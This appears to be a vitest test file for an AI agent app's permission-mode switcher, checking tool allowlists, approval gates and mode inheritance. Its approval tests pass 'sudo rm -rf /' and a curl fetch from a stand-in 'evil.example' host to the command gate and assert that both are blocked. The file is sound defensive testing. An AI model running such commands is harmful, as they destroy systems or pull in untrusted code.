/**
 * ROUND-50 (R50-c1): the composer's permission-mode switcher — full|ask|plan|
 * editor. Three layers are pinned here:
 *
 *  1. STORAGE + ROUTE — sessions carry permission_mode (default "ask",
 *     migration 0020); PATCH /sessions/:id/permissions validates the 4 known
 *     values (400 otherwise) and persists; createSession defaults to "ask".
 *  2. TOOL-SET ENFORCEMENT (runtime.ts prepareTurn via sessionToolAllowList):
 *     plan = the fixed read-only/research set; editor = everything except
 *     run_command (owner: "It will not go with any commands or any
 *     terminals"); ask/full = no restriction. The intersection only NARROWS
 *     the agent's own allowlist, and an empty product becomes NO_TOOLS.
 *  3. APPROVAL WIDENING (approvals.ts): "full" auto-approves ask-tier gates
 *     (non-auto commands, non-allowlisted web hosts) WITHOUT waiting — while
 *     the denylist-supreme refusals (sudo/rm -rf, invalid URL, non-http
 *     scheme) stay hard in EVERY mode.
 *
 * Plus: the system prompt narrates the active mode, sub-agent children copy
 * the parent's mode at delegation, and the prompt's tool list reflects the
 * post-mode toolset.
 */
import { randomUUID } from "node:crypto";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, afterEach, beforeEach, describe, expect, it } from "vitest";
import type { FastifyInstance, LightMyRequestResponse } from "fastify";

import {
  PLAN_MODE_TOOLS,
  modeAllowList,
  sessionToolAllowList,
  effectiveToolNames,
  runSingleAgentTurn,
} from "../src/agents/runtime";
import { buildProjectSystemPrompt } from "../src/agents/prompts";
import { requestCommandApproval, requestWebFetchApproval } from "../src/approvals";
import { buildProjectTools, NO_TOOLS } from "../src/tools/index";
import { TOOL_NAMES, createAgent } from "../src/storage/agents";
import { createProject } from "../src/storage/projects";
import {
  appendSessionEvent,
  createSession,
  getSession,
  listSessionEvents,
} from "../src/storage/sessions";
import { getOrchestrator } from "../src/agents/orchestrator";
import type { ChatFn } from "../src/agents/chat";
import { ProviderKeyring } from "../src/providers/registry";
import { openDatabase, type SqliteDatabase } from "../src/storage/db";
import { buildServer } from "../src/server";

const TOKEN = "test-token-pm1";
const KEY = "sk-or-vtest-pm1";

let tempDir = "";
let db: SqliteDatabase;
let app: FastifyInstance;

beforeEach(() => {
  if (tempDir === "") tempDir = mkdtempSync(join(tmpdir(), "acute-permmodes-"));
  db = openDatabase(join(tempDir, `${randomUUID()}.db`));
  app = buildServer({ token: TOKEN, db, keyring: new ProviderKeyring({ ACUTE_PROVIDER_OPENROUTER: KEY }) });
});

afterEach(async () => {
  await app.close();
  db.close();
});

afterAll(() => {
  try {
    rmSync(tempDir, { recursive: true, force: true });
  } catch {
    // best-effort
  }
});

async function authInject(options: {
  method: "GET" | "POST" | "PATCH" | "DELETE";
  url: string;
  payload?: Record<string, unknown>;
}): Promise<LightMyRequestResponse> {
  return (await app.inject({ ...options, headers: { authorization: `Bearer ${TOKEN}` } })) as LightMyRequestResponse;
}

async function routeAgent(): Promise<string> {
  const response = await authInject({
    method: "POST",
    url: "/api/v1/agents",
    payload: {
      name: "PM Agent",
      systemPrompt: "terse",
      providerId: "openrouter",
      model: "test/model-1",
      temperature: 0.1,
      maxTurns: 4,
    },
  });
  expect(response.statusCode).toBe(201);
  return response.json().id as string;
}

async function routeSession(agentId: string): Promise<string> {
  const response = await authInject({
    method: "POST",
    url: "/api/v1/sessions",
    payload: { agentId, mode: "single" },
  });
  expect(response.statusCode).toBe(202);
  return response.json().id as string;
}

// ── 1. Pure allowlist math (runtime.ts) ─────────────────────────────────────

describe("modeAllowList / sessionToolAllowList (ROUND-50 R50-c1)", () => {
  it("plan mode's tool set is the owner-spec exact list: read-only/research, no writes, no commands, no indexing", () => {
    expect([...PLAN_MODE_TOOLS].sort()).toEqual(
      [
        "read_file",
        "list_dir",
        "search_files",
        "search_code",
        "web_search",
        "web_fetch",
        "browser_control",
        "todo_write",
        "memory_save",
        "memory_recall",
        "memory_list",
        "delegate_task",
      ].sort(),
    );
    // Every entry must be a REAL registered tool id.
    for (const name of PLAN_MODE_TOOLS) expect(TOOL_NAMES).toContain(name);
    // The forbidden ones are really out.
    for (const forbidden of ["write_file", "edit_file", "create_dir", "delete_file", "run_command", "index_project"]) {
      expect(PLAN_MODE_TOOLS).not.toContain(forbidden);
    }
  });

  it("modeAllowList: plan → the read-only set; editor → all tools except run_command; ask/full → undefined (no restriction)", () => {
    expect(modeAllowList("plan")).toEqual(PLAN_MODE_TOOLS);
    expect(modeAllowList("editor")).toEqual([...TOOL_NAMES].filter((t) => t !== "run_command"));
    expect(modeAllowList("ask")).toBeUndefined();
    expect(modeAllowList("full")).toBeUndefined();
  });

  it("sessionToolAllowList intersects the mode with the agent's own allowlist — a mode never widens it", () => {
    const session = { id: "s", parentSessionId: null, permissionMode: "plan" as const };
    // Agent restricted to research tools → plan keeps exactly the overlap.
    const researcher = { allowedTools: ["read_file", "web_search", "run_command"] };
    expect(sessionToolAllowList(session, researcher)).toEqual(["read_file", "web_search"]);

    // Agent restricted to ONLY write tools in plan mode → empty product
    // becomes the NO_TOOLS sentinel (an empty array would mean "ALL").
    const writer = { allowedTools: ["write_file", "edit_file"] };
    expect(sessionToolAllowList(session, writer)).toBe(NO_TOOLS);

    // editor mode removes run_command from whatever the agent had.
    const sessionEditor = { id: "s", parentSessionId: null, permissionMode: "editor" as const };
    expect(sessionToolAllowList(sessionEditor, { allowedTools: [] })).toEqual(
      [...TOOL_NAMES].filter((t) => t !== "run_command"),
    );

    // ask mode passes the agent allowlist through untouched.
    const sessionAsk = { id: "s", parentSessionId: null, permissionMode: "ask" as const };
    expect(sessionToolAllowList(sessionAsk, researcher)).toBe(researcher.allowedTools);
  });

  it("children at the delegation-depth cap lose delegate_task BEFORE the mode intersection", () => {
    const session = { id: "s", parentSessionId: "sess_parent", permissionMode: "plan" as const };
    const agent = { allowedTools: [] }; // ALL tools
    const atCap = sessionToolAllowList(session, agent, 3);
    expect([...(atCap ?? [])].sort()).toEqual(
      [...PLAN_MODE_TOOLS.filter((t) => t !== "delegate_task")].sort(),
    );
    // Below the cap the child keeps delegate_task (nested delegation, R49).
    // (Order = TOOL_NAMES registration order — the mode only filters.)
    const belowCap = sessionToolAllowList(session, agent, 2);
    expect([...(belowCap ?? [])].sort()).toEqual([...PLAN_MODE_TOOLS].sort());
  });
});

// ── 2. Route: PATCH /sessions/:id/permissions ───────────────────────────────

describe("PATCH /api/v1/sessions/:id/permissions (ROUND-50 R50-c1)", () => {
  it("persists each of the 4 modes and returns the updated session row (GET /sessions/:id shape)", async () => {
    const agentId = await routeAgent();
    const sessionId = await routeSession(agentId);
    // Fresh sessions default to "ask".
    expect((await authInject({ method: "GET", url: `/api/v1/sessions/${sessionId}` })).json().permissionMode).toBe("ask");

    for (const mode of ["full", "ask", "plan", "editor"] as const) {
      const response = await authInject({
        method: "PATCH",
        url: `/api/v1/sessions/${sessionId}/permissions`,
        payload: { mode },
      });
      expect(response.statusCode).toBe(200);
      const body = response.json();
      expect(body.permissionMode).toBe(mode);
      // Same shape as GET /sessions/:id: the row plus events + lastSeq.
      expect(body.id).toBe(sessionId);
      expect(Array.isArray(body.events)).toBe(true);
      expect(typeof body.lastSeq).toBe("number");
      // Storage-level persistence (not just the response echo).
      expect(getSession(db, sessionId)?.permissionMode).toBe(mode);
    }
  });

  it.each([
    ["unknown mode string", { mode: "yolo" }],
    ["non-string mode", { mode: 42 }],
    ["missing mode", {}],
  ])("rejects %s with 400 VALIDATION naming body.mode", async (_name, payload) => {
    const agentId = await routeAgent();
    const sessionId = await routeSession(agentId);
    const response = await authInject({
      method: "PATCH",
      url: `/api/v1/sessions/${sessionId}/permissions`,
      payload: payload as Record<string, unknown>,
    });
    expect(response.statusCode).toBe(400);
    expect(response.json().error.code).toBe("VALIDATION");
    expect(response.json().error.details.field).toBe("body.mode");
    // The stored mode is untouched.
    expect(getSession(db, sessionId)?.permissionMode).toBe("ask");
  });

  it("404s on an unknown session and requires the bearer token", async () => {
    const missing = await authInject({
      method: "PATCH",
      url: "/api/v1/sessions/sess_missing/permissions",
      payload: { mode: "plan" },
    });
    expect(missing.statusCode).toBe(404);
    expect(missing.json().error.code).toBe("NOT_FOUND");

    const unauth = await app.inject({
      method: "PATCH",
      url: "/api/v1/sessions/sess_x/permissions",
      payload: { mode: "plan" },
    });
    expect(unauth.statusCode).toBe(401);
  });
});

// ── 3. prepareTurn enforcement: the tool set a turn actually receives ───────

/** A chat stub that records the tool NAMES each call received. */
function toolCapturingChat(): { chat: ChatFn; toolNames: string[][] } {
  const toolNames: string[][] = [];
  const chat: ChatFn = async (input) => {
    toolNames.push(input.tools !== undefined ? Object.keys(input.tools) : []);
    return { text: "Done.", usage: { inputTokens: 1, outputTokens: 1, totalTokens: 2 }, toolCalls: [] };
  };
  return { chat, toolNames };
}

async function setupProjectSession(permissionMode: "full" | "ask" | "plan" | "editor"): Promise<string> {
  const project = createProject(db, { name: "PM Project", rootPath: tempDir });
  const agent = createAgent(db, {
    name: "PM Agent",
    providerId: "openrouter",
    model: "test/model-1",
    allowedTools: [], // ALL tools — the mode is the only restriction
  });
  const session = createSession(db, {
    agentId: agent.id,
    mode: "single",
    projectId: project.id,
    permissionMode,
  });
  return session.id;
}

describe("prepareTurn tool-set enforcement per mode (ROUND-50 R50-c1)", () => {
  it("ask (default): the FULL tool set — exactly today's behavior", async () => {
    const sessionId = await setupProjectSession("ask");
    const { chat, toolNames } = toolCapturingChat();
    const outcome = await runSingleAgentTurn(
      { db, keyring: new ProviderKeyring({ ACUTE_PROVIDER_OPENROUTER: KEY }), chat },
      sessionId,
      "hello",
    );
    expect(outcome.ok).toBe(true);
    // Sorted: delegate_task registers LAST (a dynamic import after the allow
    // filter) — same SET as TOOL_NAMES, registration order aside. R66 close-out:
    // analyze_image JOINED TOOL_NAMES (allowlist vocabulary like web_fetch —
    // api.ts TOOL_CATALOG + migration 0026 with it), so the set IS TOOL_NAMES
    // (the core-vision plugin rides every turn with a db; honest refusal
    // when vision is OFF).
    expect([...toolNames[0]].sort()).toEqual([...TOOL_NAMES].sort()); // full default set (memory on)
  });

  it("plan: read-only/research tools only — no file writes, no run_command, no index_project", async () => {
    const sessionId = await setupProjectSession("plan");
    const { chat, toolNames } = toolCapturingChat();
    const outcome = await runSingleAgentTurn(
      { db, keyring: new ProviderKeyring({ ACUTE_PROVIDER_OPENROUTER: KEY }), chat },
      sessionId,
      "research the codebase",
    );
    expect(outcome.ok).toBe(true);
    expect([...toolNames[0]].sort()).toEqual(
      [...PLAN_MODE_TOOLS].sort(),
    );
    for (const forbidden of ["write_file", "edit_file", "create_dir", "delete_file", "run_command", "index_project"]) {
      expect(toolNames[0]).not.toContain(forbidden);
    }
  });

  it("editor: file tools stay but run_command is removed entirely", async () => {
    const sessionId = await setupProjectSession("editor");
    const { chat, toolNames } = toolCapturingChat();
    const outcome = await runSingleAgentTurn(
      { db, keyring: new ProviderKeyring({ ACUTE_PROVIDER_OPENROUTER: KEY }), chat },
      sessionId,
      "edit the file",
    );
    expect(outcome.ok).toBe(true);
    expect(toolNames[0]).not.toContain("run_command");
    expect(toolNames[0]).toContain("write_file");
    expect(toolNames[0]).toContain("edit_file");
    expect(toolNames[0]).toContain("delete_file");
  });

  it("full: ALL tools (the widening happens at the approval gates, not the tool set)", async () => {
    const sessionId = await setupProjectSession("full");
    const { chat, toolNames } = toolCapturingChat();
    const outcome = await runSingleAgentTurn(
      { db, keyring: new ProviderKeyring({ ACUTE_PROVIDER_OPENROUTER: KEY }), chat },
      sessionId,
      "do everything",
    );
    expect(outcome.ok).toBe(true);
    // R66 close-out: analyze_image is IN TOOL_NAMES now (see the ask-mode note).
    expect([...toolNames[0]].sort()).toEqual([...TOOL_NAMES].sort());
  });

  it("the system prompt narrates the active mode and its tool list reflects the post-mode toolset", async () => {
    // ask stays SILENT (byte-identical to pre-R50 prompts).
    const askPrompt = buildProjectSystemPrompt({
      projectName: "P",
      rootPath: "/p",
      toolNames: ["read_file", "list_dir"],
    });
    expect(askPrompt).not.toContain("PERMISSION MODE");
    // plan narrates the owner-spec posture.
    const planPrompt = buildProjectSystemPrompt({
      projectName: "P",
      rootPath: "/p",
      toolNames: ["read_file", "list_dir"],
      permissionMode: "plan",
    });
    expect(planPrompt).toContain("## PERMISSION MODE");
    expect(planPrompt).toContain("PLAN mode: read-only tools only");
    // editor + full narrate too.
    const editorPrompt = buildProjectSystemPrompt({
      projectName: "P",
      rootPath: "/p",
      toolNames: ["read_file", "write_file"],
      permissionMode: "editor",
    });
    expect(editorPrompt).toContain("EDITOR mode");
    expect(editorPrompt).toContain("run_command is disabled");
    const fullPrompt = buildProjectSystemPrompt({
      projectName: "P",
      rootPath: "/p",
      toolNames: [...TOOL_NAMES],
      permissionMode: "full",
    });
    expect(fullPrompt).toContain("FULL ACCESS mode");

    // End-to-end: a plan-mode turn's system prompt lists ONLY plan tools.
    const sessionId = await setupProjectSession("plan");
    const prompts: string[] = [];
    const chat: ChatFn = async (input) => {
      prompts.push(input.system);
      return { text: "planned.", usage: { inputTokens: 1, outputTokens: 1, totalTokens: 2 }, toolCalls: [] };
    };
    await runSingleAgentTurn(
      { db, keyring: new ProviderKeyring({ ACUTE_PROVIDER_OPENROUTER: KEY }), chat },
      sessionId,
      "plan it",
    );
    expect(prompts[0]).toContain("PLAN mode: read-only tools only");
    const toolsLine = prompts[0].match(/You have access to these tools: ([^\n]+)\./)?.[1] ?? "";
    for (const name of PLAN_MODE_TOOLS) expect(toolsLine).toContain(name);
    expect(toolsLine).not.toContain("write_file");
    expect(toolsLine).not.toContain("run_command");
  });

  it("effectiveToolNames (the context meter's slice) matches the post-mode toolset", async () => {
    const sessionId = await setupProjectSession("editor");
    const session = getSession(db, sessionId)!;
    const agent = createAgent(db, { name: "x", providerId: "openrouter", model: "m" });
    const names = effectiveToolNames(db, session, agent);
    expect(names).not.toContain("run_command");
    expect(names).toContain("write_file");
  });
});

// ── 4. Approval widening in "full" mode (approvals.ts) ──────────────────────

function approvalDeps(sessionId: string, permissionMode: "full" | "ask" | "plan" | "editor") {
  const emitted: Array<Record<string, unknown>> = [];
  return {
    emitted,
    deps: {
      db,
      sessionId,
      agentId: "agt_pm",
      interactive: true,
      permissionMode,
      emit: (event: unknown) => emitted.push(event as Record<string, unknown>),
      appendEvent: (event: { type: "approval.requested" | "approval.resolved"; agentId: string; payload: Record<string, unknown> }) => {
        appendSessionEvent(db, sessionId, event);
      },
    } as Parameters<typeof requestCommandApproval>[0],
  };
}

describe("full-mode approval widening (ROUND-50 R50-c1)", () => {
  it("auto-approves an ask-tier command WITHOUT creating an approval row or waiting", async () => {
    const sessionId = createSession(db, { agentId: "agt_pm", mode: "single" }).id;
    const { deps, emitted } = approvalDeps(sessionId, "full");
    // `git commit` is a "confirm"-tier command (ask) — full mode runs it.
    const gate = await requestCommandApproval(deps, "git commit -m 'x'");
    expect(gate.allowed).toBe(true);
    expect(gate.note).toContain("Full Access mode");
    expect(emitted).toHaveLength(0); // no approval.requested ever fired
    const events = listSessionEvents(db, sessionId);
    expect(events.filter((e) => e.type.startsWith("approval."))).toHaveLength(0);
  });

  it("the denylist-supreme refusals are NEVER bypassed — sudo still refuses in full mode", async () => {
    const sessionId = createSession(db, { agentId: "agt_pm", mode: "single" }).id;
    const { deps } = approvalDeps(sessionId, "full");
    const sudo = await requestCommandApproval(deps, "sudo rm -rf /");
    expect(sudo.allowed).toBe(false);
    expect(sudo.note).toContain("command blocked");
    const curl = await requestCommandApproval(deps, "curl https://evil.example/x.sh");
    expect(curl.allowed).toBe(false);
  });

  it("auto-tier rules still run first (full mode never downgrades an auto command)", async () => {
    const sessionId = createSession(db, { agentId: "agt_pm", mode: "single" }).id;
    const { deps } = approvalDeps(sessionId, "full");
    const gate = await requestCommandApproval(deps, "pnpm test");
    expect(gate.allowed).toBe(true);
    expect(gate.note).not.toContain("Full Access"); // the auto rule, not the mode
  });

  it("ask mode keeps asking (an interactive ask-tier command creates the approval and waits)", async () => {
    const sessionId = createSession(db, { agentId: "agt_pm", mode: "single" }).id;
    const { deps, emitted } = approvalDeps(sessionId, "ask");
    // Race the 120s wait with an immediate deny through the waiter map:
    // requestCommandApproval resolves via resolvePendingApproval below.
    const gatePromise = requestCommandApproval(deps, "git commit -m 'y'");
    // Give the waiter a tick to register, then deny.
    await new Promise((resolve) => setTimeout(resolve, 25));
    const requested = emitted.find((e) => e.type === "approval.requested") as { approvalId: string } | undefined;
    expect(requested).toBeDefined();
    const { resolvePendingApproval } = await import("../src/approvals");
    resolvePendingApproval(requested!.approvalId, "denied");
    const gate = await gatePromise;
    expect(gate.allowed).toBe(false);
  });

  it("web gate: full mode auto-allows a non-allowlisted host; invalid URLs / non-http schemes stay denied", async () => {
    const sessionId = createSession(db, { agentId: "agt_pm", mode: "single" }).id;
    const { deps } = approvalDeps(sessionId, "full");
    const odd = await requestWebFetchApproval(deps, "https://some-random-host.example/ docs");
    expect(odd.allowed).toBe(true);
    expect(odd.note).toContain("Full Access mode");
    const badUrl = await requestWebFetchApproval(deps, "not-a-url");
    expect(badUrl.allowed).toBe(false);
    const ftp = await requestWebFetchApproval(deps, "ftp://example.com/x");
    expect(ftp.allowed).toBe(false);
    // Ask mode still fails closed for non-interactive deps.
    const askDeps = approvalDeps(sessionId, "ask");
    const askGate = await requestWebFetchApproval(
      { ...askDeps.deps, interactive: false },
      "https://some-random-host.example/",
    );
    expect(askGate.allowed).toBe(false);
  });
});

// ── 5. Sub-agent children inherit the parent's mode ─────────────────────────

describe("delegation copies the parent's permission mode (ROUND-50 R50-c1)", () => {
  it("the child session row carries the parent's mode", async () => {
    const project = createProject(db, { name: "Deleg", rootPath: tempDir });
    const agent = createAgent(db, { name: "Deleg Agent", providerId: "openrouter", model: "test/model-1" });
    const parent = createSession(db, {
      agentId: agent.id,
      mode: "single",
      projectId: project.id,
      permissionMode: "plan",
    });
    const chat: ChatFn = async () => ({
      text: "child reply",
      usage: { inputTokens: 1, outputTokens: 1, totalTokens: 2 },
      toolCalls: [],
    });
    const orchestrator = getOrchestrator();
    const result = await orchestrator.delegateTask(
      { db, keyring: new ProviderKeyring({ ACUTE_PROVIDER_OPENROUTER: KEY }), chat },
      parent.id,
      "research the auth module",
      "researcher",
    );
    expect(result.ok).toBe(true);
    const child = getSession(db, result.sessionId!);
    expect(child?.permissionMode).toBe("plan");
    expect(child?.parentSessionId).toBe(parent.id);
  });
});

// ── 6. buildProjectTools consumes the mode-filtered allowlist directly ──────

describe("buildProjectTools with the mode-filtered allowlist", () => {
  it("plan-mode allowlist registers only research tools; the NO_TOOLS sentinel registers none", async () => {
    const session = { id: "s", parentSessionId: null, permissionMode: "plan" as const };
    const agent = { allowedTools: [] };
    // keyring + chat present so delegate_task registers (plan mode permits
    // delegation — only the MODE decides, same as a real turn's toolDeps).
    const chat: ChatFn = async () => ({
      text: "ok",
      usage: { inputTokens: 1, outputTokens: 1, totalTokens: 2 },
      toolCalls: [],
    });
    const planTools = await buildProjectTools(tempDir, sessionToolAllowList(session, agent), {
      db,
      sessionId: "sess_pm_tools",
      agentId: "agt_pm",
      keyring: new ProviderKeyring({ ACUTE_PROVIDER_OPENROUTER: KEY }),
      chat,
    });
    expect([...Object.keys(planTools)].sort()).toEqual([...PLAN_MODE_TOOLS].sort());

    const empty = await buildProjectTools(tempDir, NO_TOOLS, {
      db,
      sessionId: "sess_pm_tools",
      agentId: "agt_pm",
    });
    expect(Object.keys(empty)).toEqual([]);
  });
});
